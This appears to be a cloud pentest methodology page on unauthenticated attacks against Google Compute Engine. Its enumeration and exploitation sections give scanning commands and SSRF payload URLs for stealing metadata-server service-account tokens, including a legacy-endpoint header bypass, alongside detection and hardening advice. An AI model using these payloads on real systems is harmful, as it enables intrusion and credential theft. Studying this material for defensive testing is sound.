---
cstg_id: CSTG-GCP-COMPUTE-ENGINE-UNAUTH
title: "GCP Compute Engine - Unauthenticated Access"
provider: gcp
service: compute-engine
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools: [nmap, masscan, gcp-ip-range-resolver, curl, httpx, shodan, censys]
references:
  - "https://cloud.google.com/compute/docs/reference/rest/v1/instances"
  - "https://cloud.google.com/compute/docs/metadata/overview"
  - "https://cloud.google.com/vpc/docs/firewalls"
  - "https://www.gstatic.com/ipranges/cloud.json"
  - "https://cloud.google.com/compute/docs/access/iap"
  - "https://cloud.google.com/compute/docs/connect/ssh-using-third-party-tools"
license: CC BY-SA 4.0
---

## Summary

Google Compute Engine (GCE) provides Infrastructure-as-a-Service virtual machines. Each instance can be assigned one or more external (public) IP addresses, exposing services to the Internet through VPC firewall rules. From an entirely unauthenticated position - with no Google Cloud credentials and no prior access to the target organization - an external party can still discover GCE instances, fingerprint exposed services, and identify weaknesses that lead to an initial foothold.

The attacker objective at this phase is to convert "no access" into "some access": locate Internet-reachable GCE workloads, identify exposed management interfaces (SSH, RDP, serial console proxies, Kubernetes API, databases), find application-layer vulnerabilities (SSRF being especially impactful in cloud), and harvest any inadvertently public data (snapshots, images, exposed object storage referenced by the workload). The most valuable unauthenticated outcome against GCE specifically is Server-Side Request Forgery that reaches the instance metadata server, because that yields the instance's attached service-account OAuth token and thus authenticated access to the cloud control plane.

## Prerequisites

- No GCP credentials. The techniques here use only publicly reachable network endpoints and published Google IP-range data.
- Knowledge or guess of the target's external footprint: domain names, brand keywords, known IP ranges, or certificate-transparency data linking the organization to GCE-hosted hosts.

## Enumeration

### Identify Google Cloud IP space

Google publishes its external IP ranges. Cross-referencing resolved target IPs against these ranges confirms a host is GCE-hosted (versus on-prem or another provider).

```bash
# Google Cloud customer-usable external ranges
curl -s https://www.gstatic.com/ipranges/cloud.json | jq '.prefixes[] | select(.service=="Google Cloud")'

# Google's overall netblocks (includes Google-owned services)
curl -s https://www.gstatic.com/ipranges/goog.json | jq .
```

### Resolve and map the target footprint

```bash
# Certificate transparency to discover hostnames
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Resolve and check whether the address falls inside Google Cloud ranges
for h in $(cat hosts.txt); do
  ip=$(dig +short "$h" | tail -n1)
  echo "$h -> $ip"
done
```

### Passive discovery

```bash
# Shodan / Censys: GCE instances frequently expose self-signed certs,
# default cloud-init banners, and characteristic SSH/RDP fingerprints.
# Example Shodan filters:
#   org:"Google Cloud" port:22
#   ssl.cert.subject.cn:"example.com" org:"Google LLC"
```

### Active service discovery

```bash
# Fast port sweep of confirmed GCE IPs
masscan -p1-65535 --rate 1000 -oG gce_scan.txt <gce_cidr>

# Service/version fingerprint on discovered ports
nmap -sV -sC -p 22,80,443,3389,3306,5432,6443,8080,9200,10250 -iL gce_ips.txt -oA gce_fingerprint

# HTTP probing across hosts
httpx -l gce_hosts.txt -title -tech-detect -status-code -ports 80,443,8080,8443
```

Common GCE-exposed ports worth flagging: 22 (SSH), 3389 (RDP / Windows images), 6443 / 10250 (GKE node and kubelet when nodes have public IPs), 9200 (Elasticsearch), 27017 (MongoDB), 5432 / 3306 (databases), 2375/2376 (Docker), and high HTTP ports for application backends.

## Misconfigurations & Findings

- **Default-permissive firewall rules.** Networks created with the `default` network include rules such as `default-allow-ssh`, `default-allow-rdp`, and `default-allow-icmp` sourced from `0.0.0.0/0`. These expose management ports to the entire Internet.
- **Management ports open to the world.** SSH (22) and RDP (3389) reachable from `0.0.0.0/0` enable brute force, credential stuffing, and exploitation of vulnerable daemons.
- **Public IPs on workloads that do not need them.** Databases, internal apps, GKE nodes, and batch workers with ephemeral or static external IPs broaden the attack surface unnecessarily.
- **Application-layer SSRF.** A web application on a GCE VM that fetches attacker-controlled URLs can be coerced to query the metadata server. See Exploitation below - this is the highest-impact unauthenticated finding.
- **Exposed serial console / debug endpoints.** Application or framework debug pages, exposed `/metrics`, and unauthenticated dashboards leak environment details, internal IPs, and sometimes credentials.
- **Publicly shared images or snapshots.** Disk images or snapshots set to public IAM bindings (`allAuthenticatedUsers`/`allUsers`) can leak proprietary code, keys, and data baked into golden images.
- **Inadvertent metadata exposure.** Project/instance metadata containing startup scripts, SSH keys, or secrets surfaced through SSRF or a misconfigured proxy.

## Exploitation

### SSRF to the metadata server

The GCE metadata server is reachable from inside any instance at `169.254.169.254` (and the alias `metadata.google.internal`). Requests require the header `Metadata-Flavor: Google`, which blocks naive cross-origin browser SSRF but is trivially added by server-side fetchers. A vulnerable in-VM application that proxies attacker-supplied URLs can be driven to read:

```bash
# Service-account access token (authenticated cloud control-plane access)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Service-account identity and granted scopes
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes

# Project metadata, SSH keys, startup scripts
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys
http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script
```

If the legacy v0.1/v1beta1 metadata endpoints are enabled (they do not require the `Metadata-Flavor` header), even header-restricted SSRF and simple URL fetchers succeed:

```bash
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

A recovered access token converts this unauthenticated finding into authenticated access. Validate and continue under the [Enumeration page](../02-services/gcp-compute-engine-enum.md):

```bash
curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<TOKEN>"
```

### Network-service exploitation

- **SSH / RDP** open to `0.0.0.0/0`: password spraying, reuse of leaked credentials, exploitation of unpatched daemons. Project- or instance-level SSH keys in metadata further widen this.
- **Exposed databases / search engines** (Elasticsearch 9200, MongoDB 27017, Redis 6379) without authentication: direct data exfiltration.
- **Exposed kubelet (10250) on public GKE nodes**: command execution in pods via the kubelet API when anonymous auth is permitted.

### Public image / snapshot abuse

Where a project has shared an image with `allUsers`/`allAuthenticatedUsers`, the image can be cloned into an attacker-controlled project and mounted to recover any embedded secrets, source, or data.

## Detection & Logging

- **Cloud Audit Logs** record control-plane activity. Unauthenticated network probing of a VM does not appear here, but the *result* of stolen tokens does: Admin Activity and Data Access logs capture API calls (`compute.instances.list`, token-authenticated calls to other services) carrying the compromised service-account identity. Sudden API activity from a service account that historically only ran on a single VM is a strong indicator.
- **VPC Flow Logs** capture connection metadata to/from instances and reveal port scans, sweeps, and exfiltration volumes.
- **Firewall Rules Logging** records which rule allowed or denied each connection, exposing brute-force and scanning patterns against `0.0.0.0/0` rules.
- **Cloud Logging for the workload** (web server, app, OS) shows SSRF payloads, anomalous outbound fetches to `169.254.169.254`, and authentication failures.
- **Security Command Center** surfaces managed findings such as `Open SSH port`, `Open RDP port`, `Default network`, `Public IP address`, and `Web Security Scanner` SSRF/XXE detections.

## Remediation & Hardening

- Remove unnecessary external IPs; place workloads behind a load balancer or Identity-Aware Proxy (IAP) and reach management interfaces through IAP TCP forwarding rather than public SSH/RDP.
- Replace permissive `default-allow-*` firewall rules; scope source ranges tightly and never expose 22/3389 to `0.0.0.0/0`.
- Disable legacy metadata endpoints and require the `Metadata-Flavor` header by setting metadata concealment / disabling `v0.1`/`v1beta1` (`disable-legacy-endpoints=true`); prefer GKE Workload Identity / metadata concealment for clusters.
- Mitigate SSRF in applications: allowlist outbound destinations, block link-local `169.254.0.0/16`, and avoid passing user-controlled URLs to server-side fetchers.
- Audit image/snapshot IAM bindings for `allUsers`/`allAuthenticatedUsers`.
- Enable VPC Flow Logs, Firewall Rules Logging, and Security Command Center; alert on open management ports and public IP findings.

## Tools

- Network scanners and fingerprinters (nmap, masscan, httpx) for service discovery.
- Passive discovery sources (Shodan, Censys, certificate transparency) for footprint mapping.
- Google Cloud published IP-range JSON for provider attribution.
- SSRF testing utilities and request interceptors for application-layer exploitation.

## References

- GCE Instances API: https://cloud.google.com/compute/docs/reference/rest/v1/instances
- Metadata server overview: https://cloud.google.com/compute/docs/metadata/overview
- VPC firewall rules: https://cloud.google.com/vpc/docs/firewalls
- Google Cloud IP ranges: https://www.gstatic.com/ipranges/cloud.json
- Identity-Aware Proxy for TCP forwarding: https://cloud.google.com/compute/docs/access/iap
- SSH using third-party tools: https://cloud.google.com/compute/docs/connect/ssh-using-third-party-tools
